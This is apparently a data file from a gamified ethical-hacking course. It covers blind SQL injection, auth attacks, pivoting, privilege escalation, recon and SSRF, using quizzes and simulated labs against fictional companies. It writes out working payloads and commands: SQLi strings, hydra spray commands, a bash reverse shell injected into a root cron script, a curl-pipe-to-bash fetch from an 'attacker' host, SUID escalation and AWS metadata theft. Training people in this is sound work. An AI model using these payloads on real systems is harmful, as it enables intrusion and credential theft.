      {type:"pick",q:"If a WAF blocks SELECT, which bypass might work?",opts:["SEL/**/ECT (comment injection)","DELETE","FETCH","RETRIEVE"],a:"SEL/**/ECT (comment injection)",why:"SQL ignores inline comments. SEL/**/ECT becomes SELECT to the database."},
      {type:"scenario",situation:"Your SQLi payload ' OR 1=1-- gets blocked by a WAF. The error says 'Forbidden: malicious input detected.'",q:"Next move?",opts:["Try alternate encodings and comment-based bypass","Give up on SQLi","Use the same payload again","Try XSS instead"],a:"Try alternate encodings and comment-based bypass",why:"WAFs pattern-match known payloads. Encoding and comments can evade detection."}
    ]},
    {id:"i4l3",title:"Database Enumeration",rounds:[
      {type:"teach",text:"After confirming SQLi, extract data systematically. information_schema.tables lists all tables. information_schema.columns lists columns. GROUP_CONCAT combines multiple rows into one output."},
      {type:"type",q:"List all tables in the database via UNION:",a:["' UNION SELECT table_name FROM information_schema.tables--","' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables--"],why:"information_schema contains metadata about every table and column."},
      {type:"hack",story:"You've confirmed UNION SQLi on MegaCorp's portal. Now extract the database structure.",q:"List all tables using UNION injection.",a:["' UNION SELECT table_name FROM information_schema.tables--","' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables--"],output:"users\ncredit_cards\norders\nsessions\nadmin_logs\napi_keys",success:"Found credit_cards and api_keys tables. High-value targets.",why:"Systematic enumeration reveals the full database structure for targeted extraction."}
    ]},
    {id:"i4lab",title:"\uD83D\uDDA5\uFE0F Lab: Blind SQLi Attack",rounds:[
      {type:"lab",title:"Blind SQLi Attack",objective:"Exploit blind SQL injection on a login form to extract the admin password.",banner:"Target: login.quantumsoft.io\nThe login form shows no errors.\n",steps:[
        {hint:"Test for boolean-based blind SQLi.",accept:["~AND 1=1","~' AND 1=1--","' AND 1=1--"],output:"Payload: admin' AND 1=1--\nResponse: 'Invalid password' (normal error)\n\nPayload: admin' AND 1=2--\nResponse: 'Unknown user' (different error!)",successMsg:"Different responses confirm boolean-based blind SQLi!",example:"' AND 1=1--",quickCmds:["' AND 1=1--","' AND 1=2--"]},
        {hint:"Confirm with time-based test.",accept:["~SLEEP","~sleep","' AND SLEEP(5)--"],output:"Payload: admin' AND SLEEP(5)--\n[5.1 second delay]\n\nTime-based confirmed!",successMsg:"Both boolean and time-based blind SQLi confirmed.",example:"' AND SLEEP(5)--",quickCmds:["' AND SLEEP(5)--"]},
        {hint:"Use sqlmap to automate extraction.",accept:["sqlmap -u http://login.quantumsoft.io --forms --dump","~sqlmap","sqlmap -u http://login.quantumsoft.io --forms"],output:"sqlmap identified: MySQL 5.7\n[*] Extracting tables...\n  users (5 entries)\n  admin_config (1 entry)\n\nTable: users\n+----+--------+------------------+\n| id | user   | password         |\n+----+--------+------------------+\n| 1  | admin  | Qu4ntum_Adm1n!   |\n| 2  | jdoe   | Welcome123       |\n+----+--------+------------------+",successMsg:"Full database dump! Admin password extracted.",example:"sqlmap -u http://login.quantumsoft.io --forms --dump",quickCmds:["sqlmap -u target --forms --dump"]}
      ]}
    ]},
    {id:"i4m",title:"\uD83C\uDFC6 SQLi II Mastery",isCheckpoint:true,rounds:[
      {type:"pick",q:"Blind SQLi is confirmed when:",opts:["Page behavior changes based on injected true/false conditions","You see database errors","The page returns raw SQL","The server crashes"],a:"Page behavior changes based on injected true/false conditions",why:"Boolean-based: true condition = one response, false condition = different response."},
      {type:"type",q:"Test for time-based blind SQLi:",a:["' AND SLEEP(5)--","' OR SLEEP(5)--"],why:"If the response is delayed, the database executed your SLEEP command."},
      {type:"pick",q:"SEL/**/ECT bypasses WAFs because:",opts:["SQL ignores inline comments","It's a different command","The comment encrypts it","It uses a different protocol"],a:"SQL ignores inline comments",why:"/**/ is a SQL comment. The database reads SEL + ECT = SELECT."},
      {type:"type",q:"List all database tables via injection:",a:["' UNION SELECT table_name FROM information_schema.tables--","' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables--"],why:"information_schema is the database's own map of all tables."}
    ]}
  ]},
  {id:"i5",title:"Auth Attacks",desc:"Sessions, tokens, and password spraying",levels:[
    {id:"i5l1",title:"Session & Token Attacks",rounds:[
      {type:"teach",text:"Websites track logins with session cookies or JWTs. Steal a session cookie = instant access. JWT (JSON Web Token) has 3 parts: header.payload.signature. If the signature isn't verified, you can forge tokens. Change 'user' to 'admin' in the payload."},
      {type:"pick",q:"What happens if you steal someone's session cookie?",opts:["You're logged in as them instantly","You get their password","You see their browsing history","Nothing, cookies expire immediately"],a:"You're logged in as them instantly",why:"Session cookies ARE the login. No password needed."},
      {type:"scenario",situation:"You captured a JWT token. Decoded, the payload says {\"user\":\"guest\",\"role\":\"user\"}. The algorithm is set to 'none'.",q:"What can you do?",opts:["Change role to 'admin' and remove the signature","Nothing, JWTs are encrypted","Brute-force the password","Only read the data, can't modify"],a:"Change role to 'admin' and remove the signature",why:"Algorithm 'none' means no signature verification. You can freely modify the payload."}
    ]},
    {id:"i5l2",title:"Password Spraying & Credential Stuffing",rounds:[
      {type:"teach",text:"Password spraying: try ONE common password against MANY accounts (avoids lockout). Credential stuffing: use leaked username:password pairs from breaches. hydra does both: hydra -L users.txt -p 'Welcome1' ssh://target."},
      {type:"build",q:"Build a password spray against SSH:",parts:["hydra","-L","users.txt","-p","Welcome1","ssh://target"],answer:["hydra","-L","users.txt","-p","Welcome1","ssh://target"],why:"-L = user list, -p = single password. Tries one password against all users."},
      {type:"type",q:"Credential stuff with a leaked combo list:",a:["hydra -C creds.txt ssh://target","hydra -C creds.txt ftp://target"],why:"-C takes user:pass combo file. Tests exact leaked credentials."}
    ]},
    {id:"i5l3",title:"Multi-Factor Bypass",rounds:[
      {type:"teach",text:"MFA isn't bulletproof. Common bypasses: brute-force 4-6 digit codes (only 10,000 combos), intercept SMS via SIM swap, steal backup codes from config files, exploit 'remember this device' tokens."},
      {type:"pick",q:"A 4-digit MFA code has how many possibilities?",opts:["10,000","1,000","100,000","1,000,000"],a:"10,000",why:"0000-9999 = 10,000 combinations. Without rate limiting, trivially brute-forceable."},
      {type:"scenario",situation:"You've compromised a user's password but they have MFA. You notice the MFA page doesn't rate-limit attempts.",q:"Best approach?",opts:["Brute-force the 4-digit code","Give up \u2014 MFA is unbreakable","Try social engineering the user","Wait for the code to expire"],a:"Brute-force the 4-digit code",why:"Without rate limiting, 10,000 attempts takes minutes with automation."}
    ]},
    {id:"i5lab",title:"\uD83D\uDDA5\uFE0F Lab: Breach CyberVault",rounds:[
      {type:"lab",title:"Breach CyberVault",objective:"Chain multiple auth attacks to compromise CyberVault's admin panel.",banner:"Target: auth.cybervault.io\nYou have a list of employees.\n",steps:[
        {hint:"Password spray the login with a common password.",accept:["hydra -L users.txt -p 'Welcome1' http-post-form://auth.cybervault.io","~hydra","~spray"],output:"[22][ssh] host: auth.cybervault.io\nlogin: t.chen    password: Welcome1\nlogin: m.jones   password: Welcome1\n\n2 of 50 accounts compromised.",successMsg:"Two accounts using 'Welcome1'. Weak password policy!",example:"hydra -L users.txt -p Welcome1 target",quickCmds:["hydra -L users.txt -p Welcome1 target"]},
        {hint:"Login as t.chen and check their access level.",accept:["~login","~curl.*login","~ssh t.chen"],output:"Welcome, Tina Chen\nRole: Standard User\nMFA: Enabled (SMS)\n\nDashboard shows: limited access, no admin panel.",successMsg:"Standard user with SMS-based MFA. Need to escalate.",example:"ssh t.chen@auth.cybervault.io",quickCmds:["ssh t.chen@target"]},
        {hint:"Check if m.jones has higher privileges.",accept:["~login.*jones","~ssh m.jones","~curl.*jones"],output:"Welcome, Mike Jones\nRole: IT Administrator\nMFA: Enabled (4-digit PIN)\n\nAdmin panel visible! But MFA blocks access.",successMsg:"IT admin account! MFA uses only a 4-digit code.",example:"ssh m.jones@auth.cybervault.io",quickCmds:["ssh m.jones@target"]},
        {hint:"The MFA page has no rate limiting. Brute-force the 4-digit code.",accept:["~brute","~force","~python.*brute","~for.*0000.*9999"],output:"Attempting 0000... failed\nAttempting 0001... failed\n...\nAttempting 4729... SUCCESS!\n\nAdmin panel unlocked!",successMsg:"MFA bypassed via brute-force. Full admin access achieved.",example:"python3 brute_mfa.py",quickCmds:["python3 brute_mfa.py"]}
      ]}
    ]},
    {id:"i5m",title:"\uD83C\uDFC6 Auth Attacks Mastery",isCheckpoint:true,rounds:[
      {type:"pick",q:"Stealing a session cookie gives you:",opts:["Instant login as that user","Their plaintext password","Access to their email","Their MFA codes"],a:"Instant login as that user",why:"Session cookies ARE the authentication. No password needed."},
      {type:"type",q:"Password spray SSH with 'Welcome1':",a:["hydra -L users.txt -p Welcome1 ssh://target","hydra -L users.txt -p 'Welcome1' ssh://target"],why:"-L = user list, -p = single password across all accounts."},
      {type:"pick",q:"JWT with algorithm set to 'none' means:",opts:["Anyone can forge the token","The token is extra secure","The token can't be decoded","The token expires instantly"],a:"Anyone can forge the token",why:"No signature verification = free to modify the payload."},
      {type:"match",q:"Match the attack to its method:",pairs:[["Password spray","1 password \u2192 many accounts"],["Credential stuff","Leaked combos \u2192 target"],["Brute-force MFA","Try all PIN codes"],["Session hijack","Steal the cookie"]],why:"Each attack targets a different weakness in authentication systems."}
    ]}
  ]}
]};

var SEC8 = {
  id:"s8",title:"Exploitation II",tier:"intermediate",icon:"\uD83D\uDD25",color:"var(--purple)",
  units:[
  {id:"i6",title:"Advanced Shells & Pivoting",desc:"Reverse shells, port forwarding, and lateral movement",levels:[
    {id:"i6l1",title:"Reverse Shell Techniques",rounds:[
      {type:"teach",text:"Different reverse shell payloads for different situations. Bash: bash -i >& /dev/tcp/IP/PORT 0>&1. Python: python3 -c 'import socket,os,pty;...'. PHP: common for web shells. Always upgrade to a full TTY with python -c 'import pty;pty.spawn(\"/bin/bash\")'."},
      {type:"type",q:"Upgrade a dumb shell to full TTY:",a:["python3 -c 'import pty;pty.spawn(\"/bin/bash\")'","python -c 'import pty;pty.spawn(\"/bin/bash\")'"],why:"A full TTY lets you use sudo, clear screen, and tab-complete."},
      {type:"pick",q:"Why upgrade a shell to TTY?",opts:["To use interactive commands like sudo","To make the connection faster","To encrypt the traffic","To bypass antivirus"],a:"To use interactive commands like sudo",why:"Dumb shells can't handle interactive prompts. TTY fixes this."}
    ]},
    {id:"i6l2",title:"Port Forwarding & Tunneling",rounds:[
      {type:"teach",text:"After compromising one machine, reach internal networks. SSH local forward: ssh -L 8080:internal:80 user@pivot \u2014 now localhost:8080 reaches the internal server. SSH dynamic proxy: ssh -D 9050 user@pivot creates a SOCKS proxy for all traffic."},
      {type:"build",q:"Build an SSH tunnel to reach an internal web server:",parts:["ssh","-L","8080:10.0.0.5:80","user@pivot"],answer:["ssh","-L","8080:10.0.0.5:80","user@pivot"],why:"-L local:remote:port forwards your 8080 through the pivot to internal 10.0.0.5:80."},
      {type:"scenario",situation:"You've compromised a web server (10.10.10.44). It has a second NIC connected to 10.0.0.0/24 \u2014 an internal network you can't reach directly.",q:"How do you scan the internal network?",opts:["SSH tunnel through the compromised server as a pivot","Scan from your machine directly","Ask the client for VPN access","Use a different exploit"],a:"SSH tunnel through the compromised server as a pivot",why:"The compromised server is your bridge. Route traffic through it to reach internal hosts."}
    ]},
    {id:"i6l3",title:"Lateral Movement",rounds:[
      {type:"teach",text:"Move between machines using stolen credentials. Pass-the-Hash: use an NTLM hash directly without cracking it. psexec: remote execution on Windows. SSH key reuse: check ~/.ssh for keys that unlock other servers."},
      {type:"type",q:"Check for SSH keys on a compromised Linux machine:",a:["ls -la ~/.ssh/","cat ~/.ssh/id_rsa","ls ~/.ssh/"],why:"Private keys in .ssh/ might grant access to other servers."},
      {type:"pick",q:"Pass-the-Hash means:",opts:["Using the hash directly to authenticate without cracking","Forwarding traffic through a hash table","Encrypting your traffic with the hash","A type of SQL injection"],a:"Using the hash directly to authenticate without cracking",why:"Windows NTLM auth accepts the hash itself. No plaintext password needed."}
    ]},
    {id:"i6lab",title:"\uD83D\uDDA5\uFE0F Lab: Pivot Attack",rounds:[
      {type:"lab",title:"Pivot Attack",objective:"Compromise a web server, pivot to the internal network, and reach the database.",banner:"Engagement: MegaCorp Internal\nInitial access: web-server (10.10.10.44)\nGoal: Reach DB server on internal network\n",steps:[
        {hint:"Check the compromised server's network interfaces.",accept:["ip addr","ifconfig","~ip a"],output:"eth0: 10.10.10.44/24  (external)\neth1: 10.0.0.1/24    (internal)\n\nTwo network interfaces!",successMsg:"Dual-homed! eth1 connects to the internal 10.0.0.0/24 network.",example:"ip addr",quickCmds:["ip addr"]},
        {hint:"Scan the internal network from the compromised server.",accept:["nmap -sn 10.0.0.0/24","~nmap.*10.0.0"],output:"Host: 10.0.0.1  (this machine)\nHost: 10.0.0.50 (db-server)\nHost: 10.0.0.100 (file-share)",successMsg:"Found the database server at 10.0.0.50!",example:"nmap -sn 10.0.0.0/24",quickCmds:["nmap -sn 10.0.0.0/24"]},
        {hint:"Check for SSH keys that might access the DB server.",accept:["ls ~/.ssh/","cat ~/.ssh/id_rsa","~ls.*ssh","~cat.*ssh"],output:"-rw------- 1 www-data www-data 1679 id_rsa\n-rw-r--r-- 1 www-data www-data  400 id_rsa.pub\n-rw-r--r-- 1 www-data www-data   89 known_hosts\n\nknown_hosts: 10.0.0.50 db-server",successMsg:"SSH key exists and the known_hosts confirms connection to db-server!",example:"ls -la ~/.ssh/",quickCmds:["ls -la ~/.ssh/"]},
        {hint:"SSH into the database server using the key.",accept:["ssh -i ~/.ssh/id_rsa root@10.0.0.50","~ssh.*10.0.0.50","ssh root@10.0.0.50"],output:"Welcome to db-server\nroot@db-server:~# whoami\nroot\n\nMySQL is running with root access.",successMsg:"Root on the database server via key reuse. Full compromise!",example:"ssh -i ~/.ssh/id_rsa root@10.0.0.50",quickCmds:["ssh -i ~/.ssh/id_rsa root@10.0.0.50"]}
      ]}
    ]},
    {id:"i6m",title:"\uD83C\uDFC6 Shells & Pivoting Mastery",isCheckpoint:true,rounds:[
      {type:"type",q:"Upgrade a dumb shell to full TTY:",a:["python3 -c 'import pty;pty.spawn(\"/bin/bash\")'","python -c 'import pty;pty.spawn(\"/bin/bash\")'"],why:"Full TTY enables interactive commands."},
      {type:"build",q:"SSH tunnel to internal web server:",parts:["ssh","-L","8080:10.0.0.5:80","user@pivot"],answer:["ssh","-L","8080:10.0.0.5:80","user@pivot"],why:"Forwards your port 8080 through the pivot to internal server."},
      {type:"pick",q:"You find SSH keys on a compromised server. You should:",opts:["Try them on other internal servers","Delete them to cover tracks","Ignore them, they're probably old","Report them to the client immediately"],a:"Try them on other internal servers",why:"SSH keys are reused constantly. Check known_hosts for targets."},
      {type:"type",q:"Check for reusable SSH keys:",a:["ls -la ~/.ssh/","cat ~/.ssh/id_rsa","ls ~/.ssh/"],why:"Private keys and known_hosts reveal lateral movement paths."}
    ]}
  ]},
  {id:"i7",title:"Advanced PrivEsc",desc:"SUID, cron, kernel exploits, and Docker breakout",levels:[
    {id:"i7l1",title:"SUID & Capabilities",rounds:[
      {type:"teach",text:"SUID binaries run as root regardless of who calls them. find / -perm -4000 lists all SUID files. GTFOBins shows which can be exploited. Capabilities are granular SUID: getcap -r / 2>/dev/null finds binaries with special powers like cap_setuid."},
      {type:"type",q:"Find all SUID binaries:",a:["find / -perm -4000 2>/dev/null","find / -perm -u=s 2>/dev/null","find / -perm -4000 -type f 2>/dev/null"],why:"SUID files run as their owner (usually root). Any exploitable one = root."},
      {type:"hack",story:"You're www-data on a CyberVault server. Time to escalate.",q:"Search for SUID binaries that might give root.",a:["find / -perm -4000 2>/dev/null","find / -perm -u=s 2>/dev/null"],output:"/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/python3\n/usr/bin/mount\n/usr/bin/pkexec",success:"python3 has SUID! GTFOBins shows: python3 -c 'import os;os.execl(\"/bin/bash\",\"bash\",\"-p\")' gives root.",why:"SUID python = instant root. It's like giving everyone a master key."}
    ]},
    {id:"i7l2",title:"Cron & Writable Scripts",rounds:[
      {type:"teach",text:"Cron runs scripts on a schedule. If a cron job runs a script YOU can edit, you control what runs as root. Check: cat /etc/crontab, ls -la /etc/cron.d/, look for writable scripts in cron entries."},
      {type:"type",q:"Check crontab for scheduled jobs:",a:["cat /etc/crontab","crontab -l","ls /etc/cron.d/"],why:"Cron entries show what runs automatically and as which user."},
      {type:"hack",story:"You found a cron job: * * * * * root /opt/scripts/cleanup.sh. The script is world-writable.",q:"Inject a reverse shell into the writable cron script.",a:["echo 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1' >> /opt/scripts/cleanup.sh","~echo.*cleanup","~bash.*cleanup"],output:"$ echo 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' >> /opt/scripts/cleanup.sh\n$ nc -lvnp 4444\nListening...\n[1 minute later]\nroot@target:~# whoami\nroot",success:"Cron ran your payload as root! Full root shell received.",why:"World-writable scripts in root cron jobs = guaranteed root access."}
    ]},
    {id:"i7l3",title:"Kernel & Docker Exploits",rounds:[
      {type:"teach",text:"Kernel exploits: uname -r shows version, searchsploit finds exploits. DirtyPipe, DirtyCow are famous ones. Docker escape: if you're in a Docker container with --privileged, you can mount the host filesystem and escape."},
      {type:"type",q:"Check kernel version for exploits:",a:["uname -r","uname -a","cat /proc/version"],why:"Exact kernel version lets you search for specific privilege escalation exploits."},
      {type:"pick",q:"A Docker container started with --privileged means:",opts:["You can escape to the host system","It runs with no network access","It's completely isolated","It auto-updates daily"],a:"You can escape to the host system",why:"--privileged gives the container full host device access. You can mount the host disk."}
    ]},
    {id:"i7lab",title:"\uD83D\uDDA5\uFE0F Lab: Root NovaTech",rounds:[
      {type:"lab",title:"Root NovaTech",objective:"Escalate from www-data to root using multiple vectors.",banner:"Connected to novatech-web\n$ whoami\nwww-data\nGoal: Get root.\n",steps:[
        {hint:"Run linpeas to find all escalation vectors.",accept:["./linpeas.sh","~linpeas","curl http://attacker/linpeas.sh | bash"],output:"[+] SUID binaries:\n  /usr/bin/find (GTFOBins!)\n\n[+] Writable cron scripts:\n  /opt/backup/run.sh (runs as root every 5 min)\n\n[+] Kernel: 5.4.0-42 (DirtyPipe candidate)",successMsg:"Three vectors found! SUID find, writable cron, and old kernel.",example:"./linpeas.sh",quickCmds:["./linpeas.sh"]},
        {hint:"Use the SUID find binary to get root.",accept:["find . -exec /bin/bash -p \\;","find . -exec /bin/sh -p \\;","~find.*exec.*bash","~find.*exec.*sh"],output:"$ find . -exec /bin/bash -p \\;\nbash-5.0# whoami\nroot\nbash-5.0# id\nuid=33(www-data) gid=33 euid=0(root)",successMsg:"Root via SUID find! The -p flag preserves the elevated privileges.",example:"find . -exec /bin/bash -p \\;",quickCmds:["find . -exec /bin/bash -p \\;"]},
        {hint:"Read the root flag.",accept:["cat /root/flag.txt","~cat /root","~cat.*flag"],output:"FLAG{novatech_rooted_2024}\n\nCongrats! Full system compromise achieved.",successMsg:"Root flag captured! Engagement complete.",example:"cat /root/flag.txt",quickCmds:["cat /root/flag.txt"]}
      ]}
    ]},
    {id:"i7m",title:"\uD83C\uDFC6 PrivEsc II Mastery",isCheckpoint:true,rounds:[
      {type:"type",q:"Find SUID binaries:",a:["find / -perm -4000 2>/dev/null","find / -perm -u=s 2>/dev/null"],why:"SUID files run as owner. Exploitable ones = instant root."},
      {type:"type",q:"Check crontab:",a:["cat /etc/crontab","crontab -l"],why:"Cron jobs with writable scripts = root code execution."},
      {type:"pick",q:"A world-writable script in a root cron job means:",opts:["Anyone can inject commands that run as root","The script can't be executed","Only root can edit it","It runs in a sandbox"],a:"Anyone can inject commands that run as root",why:"You write the payload, cron executes it as root."},
      {type:"type",q:"Check kernel version:",a:["uname -r","uname -a","cat /proc/version"],why:"Match the kernel version to known exploits like DirtyPipe."}
    ]}
  ]}
]};


// =============================================
// ADVANCED SECTION (7 units, 35 levels)
// Short reads, straight into labs. Independence.
// =============================================

var SEC9 = {
  id:"s9",title:"Advanced Terminal & Recon",tier:"advanced",icon:"\uD83D\uDC27",color:"var(--green)",
  units:[
  {id:"a1",title:"Recon Automation",desc:"Script your own recon pipeline",levels:[
    {id:"a1l1",title:"Building Recon Scripts",rounds:[
      {type:"teach",text:"Real pentesters chain tools into scripts. A basic recon script: run whois, dig, subfinder, httpx, then nmap. Pipe output between tools and save to files. Automate what you'd do manually."},
      {type:"type",q:"Run subfinder to enumerate subdomains and pipe to httpx:",a:["subfinder -d target.com | httpx","subfinder -d target.com -silent | httpx"],why:"subfinder finds subdomains, httpx checks which are live."},
      {type:"hack",story:"You're starting a bug bounty on Apex Financial. Automate your initial recon.",q:"Chain subfinder and httpx to find live subdomains.",a:["subfinder -d apex.com | httpx","subfinder -d apex.com -silent | httpx -silent"],output:"https://portal.apex.com [200]\nhttps://api.apex.com [200]\nhttps://staging.apex.com [200]\nhttps://dev-internal.apex.com [403]\nhttps://legacy.apex.com [200]",success:"5 live subdomains. staging and dev-internal are high-value targets.",why:"Automation finds more targets faster than manual enumeration."}
    ]},
    {id:"a1l2",title:"Custom Wordlists",rounds:[
      {type:"teach",text:"Generic wordlists miss target-specific paths. cewl scrapes a website to build custom wordlists from its own content. Combine with industry-specific terms. Better wordlists = more findings."},
      {type:"type",q:"Generate a custom wordlist from a target website:",a:["cewl http://target.com -w custom.txt","cewl http://target.com -d 2 -w custom.txt"],why:"cewl crawls the site and extracts words for a targeted wordlist."},
      {type:"hack",story:"Apex Financial's login uses employee IDs. Scrape their site for potential usernames.",q:"Use cewl to build a wordlist from the Apex website.",a:["cewl http://apex.com -w apex_words.txt","cewl apex.com -w apex_words.txt","~cewl.*apex"],output:"CeWL 5.5.2 - Words: 847\nSaved to: apex_words.txt\n\nTop words: apex, financial, portal, investor,\njohnson, chen, williams, quarterly, dividends",success:"Employee names in the wordlist! johnson, chen, williams could be usernames.",why:"Company websites often leak employee names, product terms, and internal jargon."}
    ]},
    {id:"a1lab",title:"\uD83D\uDDA5\uFE0F Lab: Automated Recon",rounds:[
      {type:"lab",title:"Automated Recon",objective:"Run a full automated recon pipeline against Apex Financial.",banner:"Bug Bounty: Apex Financial\nScope: *.apex.com\nGo.\n",steps:[
        {hint:"Enumerate subdomains.",accept:["subfinder -d apex.com","~subfinder","~sublist3r","amass enum -d apex.com"],output:"portal.apex.com\napi.apex.com\nstaging.apex.com\ndev-internal.apex.com\nlegacy.apex.com\nbackup.apex.com\nmail.apex.com",successMsg:"7 subdomains found.",example:"subfinder -d apex.com",quickCmds:["subfinder -d apex.com"]},
        {hint:"Check which are live with httpx.",accept:["~httpx","~| httpx","cat subs.txt | httpx"],output:"https://portal.apex.com [200] [Login Portal]\nhttps://api.apex.com [200] [API v2]\nhttps://staging.apex.com [200] [Staging]\nhttps://legacy.apex.com [200] [Apex Legacy]\nhttps://backup.apex.com [403] [Forbidden]",successMsg:"5 live, 1 forbidden. Legacy and staging are juicy.",example:"cat subs.txt | httpx",quickCmds:["cat subs.txt | httpx"]},
        {hint:"Run nuclei vulnerability scanner against live hosts.",accept:["nuclei -l live.txt","~nuclei","nuclei -u https://staging.apex.com"],output:"[critical] CVE-2024-1234 on staging.apex.com\n[high] exposed-git on legacy.apex.com/.git\n[medium] cors-misconfiguration on api.apex.com\n[info] tech-detect WordPress on legacy.apex.com",successMsg:"Critical CVE on staging, exposed .git on legacy! Multiple findings.",example:"nuclei -l live.txt",quickCmds:["nuclei -l live.txt"]},
        {hint:"Download the exposed git repository.",accept:["git-dumper https://legacy.apex.com/.git ./dump","~git-dumper","~git.*dump","wget -r https://legacy.apex.com/.git"],output:"Downloading objects... 100%\nExtracted 234 files\n\nFound: config/database.yml\n  production:\n    password: Ap3x_Pr0d_2024!",successMsg:"Production database password from the git repo! Critical finding.",example:"git-dumper https://legacy.apex.com/.git dump",quickCmds:["git-dumper https://legacy.apex.com/.git dump"]}
      ]}
    ]},
    {id:"a1lab2",title:"\uD83D\uDDA5\uFE0F Lab: OSINT Deep Dive",rounds:[
      {type:"lab",title:"OSINT Deep Dive",objective:"Gather intelligence on Apex Financial without touching their servers.",banner:"Passive Recon Only\nTarget: Apex Financial (apex.com)\nDo NOT touch their infrastructure.\n",steps:[
        {hint:"Check DNS records for mail and other services.",accept:["dig apex.com ANY","dig apex.com mx","~dig.*apex","nslookup apex.com"],output:"MX: mail.apex.com -> 10.50.1.10\nTXT: v=spf1 include:_spf.google.com ~all\nNS: ns1.cloudflare.com\nA: 104.21.45.67 (Cloudflare)",successMsg:"They use Google Workspace for email and Cloudflare for CDN.",example:"dig apex.com ANY",quickCmds:["dig apex.com ANY"]},
        {hint:"Search for leaked credentials on breach databases.",accept:["~breach","~leak","~haveibeenpwned","theHarvester -d apex.com -b all"],output:"theHarvester results:\n  Emails: ceo@apex.com, admin@apex.com, t.chen@apex.com\n  Hosts: portal.apex.com, vpn.apex.com\n  Breaches: 3 apex.com emails found in 2023 LinkedIn breach",successMsg:"3 employee emails in a breach! Those credentials may still work.",example:"theHarvester -d apex.com -b all",quickCmds:["theHarvester -d apex.com -b all"]},
        {hint:"Check their SSL certificate for additional subdomains.",accept:["~crt.sh","~ssl","~cert","curl 'https://crt.sh/?q=apex.com'"],output:"crt.sh results:\n  *.apex.com\n  portal.apex.com\n  vpn.apex.com\n  jira.apex.com\n  confluence.apex.com\n  gitlab.apex.com",successMsg:"Internal tools exposed: Jira, Confluence, GitLab. Huge attack surface.",example:"curl 'https://crt.sh/?q=apex.com'",quickCmds:["curl 'https://crt.sh/?q=apex.com'"]}
      ]}
    ]},
    {id:"a1m",title:"\uD83C\uDFC6 Recon III Mastery",isCheckpoint:true,rounds:[
      {type:"type",q:"Enumerate subdomains and check which are live:",a:["subfinder -d target.com | httpx","subfinder -d target.com -silent | httpx"],why:"Chain tools: find subdomains then verify they're up."},
      {type:"type",q:"Build a custom wordlist from a target site:",a:["cewl http://target.com -w custom.txt","cewl http://target.com -d 2 -w custom.txt"],why:"Target-specific wordlists find what generic ones miss."},
      {type:"pick",q:"An exposed .git directory lets you:",opts:["Download source code and find secrets","See live traffic","Access the admin panel","Crash the server"],a:"Download source code and find secrets",why:"Git repos contain full source code, config files, and hardcoded credentials."},
      {type:"scenario",situation:"You found 3 employee emails in a data breach from 2023. The company hasn't enforced password resets.",q:"Next step?",opts:["Try the breached credentials on login portals","Report to the company immediately","Ignore it, old breaches don't matter","Scan their network aggressively"],a:"Try the breached credentials on login portals",why:"People reuse passwords. Breached creds from 2023 might still work in 2025."}
    ]}
  ]}
]};

var SEC10 = {
  id:"s10",title:"Advanced Web Attacks",tier:"advanced",icon:"\u26A1",color:"var(--red)",
  units:[
  {id:"a2",title:"Chained Web Exploits",desc:"Combine vulnerabilities for maximum impact",levels:[
    {id:"a2l1",title:"Attack Chains",rounds:[
      {type:"teach",text:"Real attacks chain multiple vulns. SSRF \u2192 internal access. XSS \u2192 session steal \u2192 admin takeover. SQLi \u2192 file read \u2192 SSH key \u2192 shell. One bug alone might be medium severity, but chained together = critical."},
      {type:"scenario",situation:"You found reflected XSS on a support page and know an admin reviews support tickets.",q:"How do you chain this into an account takeover?",opts:["Inject XSS that steals admin's session cookie when they view the ticket","Report the XSS and move on","Use the XSS to deface the page","Brute-force the admin password instead"],a:"Inject XSS that steals admin's session cookie when they view the ticket",why:"Stored XSS in a ticket the admin reads = automatic session theft. XSS alone is medium, but chained to admin takeover it's critical."},
      {type:"scenario",situation:"You found SSRF on an internal tool. The server can make requests to internal IPs. AWS metadata is at 169.254.169.254.",q:"What do you target with the SSRF?",opts:["AWS metadata endpoint for IAM credentials","Google.com to test connectivity","The company homepage","A random external IP"],a:"AWS metadata endpoint for IAM credentials",why:"SSRF to AWS metadata = IAM credentials = access to S3 buckets, databases, everything."}
    ]},
    {id:"a2l2",title:"SSRF Exploitation",rounds:[
      {type:"teach",text:"Server-Side Request Forgery: trick the server into making requests for you. Change URL parameters to internal IPs. Target: cloud metadata (169.254.169.254), internal services, localhost admin panels."},
      {type:"hack",story:"Apex Financial's PDF generator fetches URLs to convert to PDF. You control the URL parameter.",q:"Exploit SSRF to access AWS metadata.",a:["http://169.254.169.254/latest/meta-data/","~169.254.169.254","~metadata","curl http://169.254.169.254/latest/meta-data/iam/security-credentials/"],output:"{\n  \"AccessKeyId\": \"AKIA4EXAMPLE\",\n  \"SecretAccessKey\": \"wJalrXUtnFEMI/K7MDENG...\",\n  \"Token\": \"FwoGZXIvYXdzEBY...\",\n  \"Expiration\": \"2025-03-15T12:00:00Z\"\n}",success:"AWS IAM credentials stolen via SSRF! Full cloud access.",why:"Cloud metadata endpoints are the #1 SSRF target. They return temporary credentials."}
    ]},
    {id:"a2lab",title:"\uD83D\uDDA5\uFE0F Lab: Chain Attack",rounds:[
      {type:"lab",title:"Chain Attack on Apex",objective:"Chain multiple vulnerabilities to fully compromise Apex Financial.",banner:"Apex Financial Pentest - Phase 2\nYou've completed recon. Time to exploit.\n",steps:[
        {hint:"Test the login page for SQL injection.",accept:["~' OR","~sqlmap","~sql","' OR 1=1--"],output:"Payload: admin' OR 1=1--\nResponse: Welcome, admin!\n\nBypass successful. Admin dashboard loaded.",successMsg:"SQLi login bypass! You're in the admin panel.",example:"' OR 1=1--",quickCmds:["' OR 1=1--"]},
        {hint:"The admin panel has a 'Generate Report' feature with a URL field. Test for SSRF.",accept:["~169.254","~metadata","~ssrf","http://169.254.169.254/latest/meta-data/"],output:"Report generated!\nContent: {\n  \"AccessKeyId\": \"AKIA4APEX...\",\n  \"SecretAccessKey\": \"Nq4+3x...\"\n}",successMsg:"SSRF confirmed! AWS credentials extracted from the report generator.",example:"http://169.254.169.254/latest/meta-data/",quickCmds:["http://169.254.169.254/latest/meta-data/"]},
